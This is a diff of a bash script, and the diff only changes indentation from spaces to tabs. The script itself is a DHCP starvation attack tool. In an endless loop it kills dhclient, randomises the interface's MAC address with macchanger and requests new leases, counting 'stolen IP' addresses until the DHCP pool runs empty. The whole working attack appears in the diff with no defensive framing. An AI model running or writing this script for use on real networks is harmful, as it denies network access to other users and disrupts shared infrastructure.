@@ -1,32 +1,32 @@
 #!/bin/bash
 
 if [[ -z $1 ]]; then
-   interface='eth0'
+	interface='eth0'
 else
-   interface=$1
+	interface=$1
 fi
 
 if [ ! -L "/sys/class/net/${interface}" ]
 then
-      echo "ERROR : Unknown network interface : ${interface}"
+	echo "ERROR : Unknown network interface : ${interface}"
 
-      echo -n "         network interfaces : "
-      find /sys/class/net/ -maxdepth 1 -type l -printf '%f '
-      echo
+	echo -n "         network interfaces : "
+	find /sys/class/net/ -maxdepth 1 -type l -printf '%f '
+	echo
 
-      exit 1
+	exit 1
 fi
 
 if [ -z $(which macchanger) ]
 then
-      echo "ERROR : The tool 'macchanger' is not installed"
-      exit 2
+	echo "ERROR : The tool 'macchanger' is not installed"
+	exit 2
 fi
 
 if (( EUID ))
 then
-      echo "ERROR : This program must be run with the root rights"
-      exit 3
+	echo "ERROR : This program must be run with the root rights"
+	exit 3
 fi
 
 LEASETime=172800 # 2 days = 172800s
@@ -46,39 +46,39 @@ NumberAddress=0
 NumberStolenIP=0
 
 while true; do
-      # We kill every dhclient process
-      if [ -e "${PIDFile}" ]
-      then
-         PID=$(cat "${PIDFile}")
-         kill "${PID}"
-         while kill -0 "${PID}" 2>/dev/null; do
-            sleep 1
-         done
-      fi
-      rm -f "${PIDFile}" "${LEASEFile}"
+	# We kill every dhclient process
+	if [ -e "${PIDFile}" ]
+	then
+		PID=$(cat "${PIDFile}")
+		kill "${PID}"
+		while kill -0 "${PID}" 2>/dev/null; do
+			sleep 1
+		done
+	fi
+	rm -f "${PIDFile}" "${LEASEFile}"
 
-      # We disable our interface
-      ip link set "${interface}" down
-      #ifconfig "${interface}" down
+	# We disable our interface
+	ip link set "${interface}" down
+	#ifconfig "${interface}" down
 
-      ip add flush "${interface}"
-      #ifconfig "${interface}" 0.0.0.0
+	ip add flush "${interface}"
+	#ifconfig "${interface}" 0.0.0.0
 
-      echo -n "$((++NumberAddress))] "
-      # We switch our MAC address for out interface
-      macchanger -a "${interface}" | grep '^New MAC:'
+	echo -n "$((++NumberAddress))] "
+	# We switch our MAC address for out interface
+	macchanger -a "${interface}" | grep '^New MAC:'
 
-      # We enable again our interface
-      ip link set "${interface}" up
-      #ifconfig "${interface}" up
+	# We enable again our interface
+	ip link set "${interface}" up
+	#ifconfig "${interface}" up
 
-      # We get a new DHCP Lease
-      if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
-      then
-         echo "dhcp pool perhaps empty (${NumberStolenIP} stolen IP) !!!!"
-      else
-         ((NumberStolenIP++))
-      fi
+	# We get a new DHCP Lease
+	if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
+	then
+		echo "dhcp pool perhaps empty (${NumberStolenIP} stolen IP) !!!!"
+	else
+		((NumberStolenIP++))
+	fi
 
-      sleep 1s
+	sleep 1s
 done
